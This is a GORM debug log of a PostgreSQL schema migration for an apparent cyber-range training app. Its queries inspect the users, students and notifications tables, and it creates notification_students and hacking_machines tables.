2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.771ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND table_type = 'BASE TABLE'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.389ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.527ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'users'

2025/06/09 14:07:48 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.619ms] [34;1m[rows:-][0m SELECT * FROM "users" LIMIT 5

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[27.233ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'users' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[46.673ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'users'

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.836ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'users'

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.236ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.244ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.204ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.302ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.280ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'user_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.175ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'first_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.256ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'last_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.134ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'middle_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.224ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'email') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.087ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'phone') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.067ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'password') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.120ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'email_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.569ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'phone_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.172ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'locked') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.921ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'users' AND indexname = 'idx_users_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[5.079ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND table_type = 'BASE TABLE'

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.420ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.094ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'students'

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.855ms] [34;1m[rows:-][0m SELECT * FROM "students" LIMIT 5

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[22.706ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'students' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[17.178ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'students'

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.007ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'students'

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.102ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.049ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.140ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.138ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.151ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND column_name = 'is_premiem') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.161ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND column_name = 'user_id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.935ms] [34;1m[rows:1][0m SELECT count(*) FROM INFORMATION_SCHEMA.table_constraints WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND constraint_name = 'fk_students_user'

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.833ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'students' AND indexname = 'idx_students_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.857ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'students' AND indexname = 'idx_student_user' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.626ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'notifications' AND table_type = 'BASE TABLE'

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.497ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.770ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'notifications'

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.642ms] [34;1m[rows:-][0m SELECT * FROM "notifications" LIMIT 5

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[22.898ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'notifications' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[20.828ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'notifications'

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.566ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'notifications'

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.116ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'notifications' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'notifications' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.146ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'notifications' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'notifications' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.050ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'notifications' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'notifications' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.208ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'notifications' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'notifications' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.225ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'notifications' AND column_name = 'message') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'notifications' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.093ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'notifications' AND column_name = 'type') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'notifications' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.158ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'notifications' AND column_name = 'send_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'notifications' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.202ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'notifications' AND column_name = 'read') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'notifications' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.855ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'notifications' AND indexname = 'idx_notifications_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.659ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'notification_students' AND table_type = 'BASE TABLE'

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[20.717ms] [34;1m[rows:0][0m CREATE TABLE "notification_students" ("id" bigserial,"created_at" timestamptz,"updated_at" timestamptz,"deleted_at" timestamptz,"student_id" bigint,"notification_id" bigint,PRIMARY KEY ("id"),CONSTRAINT "fk_notification_students_notification" FOREIGN KEY ("notification_id") REFERENCES "notifications"("id"),CONSTRAINT "fk_notification_students_student" FOREIGN KEY ("student_id") REFERENCES "students"("id"))

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[9.930ms] [34;1m[rows:0][0m CREATE INDEX IF NOT EXISTS "idx_notification_students_deleted_at" ON "notification_students" ("deleted_at")

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.673ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'hacking_machines' AND table_type = 'BASE TABLE'

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[21.920ms] [34;1m[rows:0][0m CREATE TABLE "hacking_machines" ("id" bigserial,"created_at" timestamptz,"updated_at" timestamptz,"deleted_at" timestamptz,"image_name_or_id" text NOT NULL,PRIMARY KEY ("id"))

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[17.565ms] [34;1m[rows:0][0m CREATE INDEX IF NOT EXISTS "idx_hacking_machines_deleted_at" ON "hacking_machines" ("deleted_at")

